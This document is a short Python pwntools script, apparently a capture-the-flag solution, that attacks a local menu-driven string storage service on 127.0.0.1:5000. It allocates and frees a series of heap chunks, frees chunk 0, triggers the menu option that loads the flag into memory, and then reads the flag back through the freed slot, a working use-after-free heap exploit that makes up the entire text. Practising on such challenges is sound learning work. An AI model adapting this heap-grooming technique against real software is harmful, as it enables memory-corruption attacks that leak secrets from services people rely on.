from pwn import *


#io = process("./a.out") # lol remember to rename it

io = remote("127.0.0.1", 5000)

#io.timeout = 2
#gdb.attach(io)

"""
>> 0
Input string length (including null terminator): 2
h
Which string number do you want to store it in?
[0-15]>> 4
"""

fl = 47 # flag len
fn = fl -1 #flag -1

for i in range(0, 8):   # populate fastbin
    #print("WOOP");
    io.recvuntil(">> ") # main loop
    io.sendline(b"0")    # write string
    io.recvuntil(": ")
    #io.sendline(b"32")   # length of string
    #io.sendline(b"A"*8) # input
    io.sendline(bytes(str(fl), 'utf-8'))   # length of string
    io.sendline(b"A"*fn) # input
    io.recvuntil(">> ")
    io.sendline(bytes(str(i), 'utf-8'))


for i in range(0, 7):   # freeing fastbin
    io.recvuntil(b">> ") # main loop
    io.sendline(b"2")    # free
    io.recvuntil(b">> ") # number to free
    io.sendline(bytes(str(i), 'utf-8'))

# Write into `0`
io.recvuntil(">> ")  # main loop
io.sendline(b"0")    # write string
io.recvuntil(": ")
io.sendline(bytes(str(fl), 'utf-8'))   # length of string
io.sendline(b"A"*fn) # input
io.recvuntil(">> ")
io.sendline(b"0")

# Free `0`
io.recvuntil(">> ") # main loop
io.sendline(b"2")   # free
io.recvuntil(">> ") # number to free
io.sendline(b"0")

# read the flag
io.recvuntil(">> ") # main loop
io.sendline(b"3")   # write string

# print the flag from `0`
io.recvuntil(">> ") # main loop
io.sendline(b"1")   # read str
io.recvuntil(">> ") # main loop
io.sendline(b"0")   # read index

io.interactive()

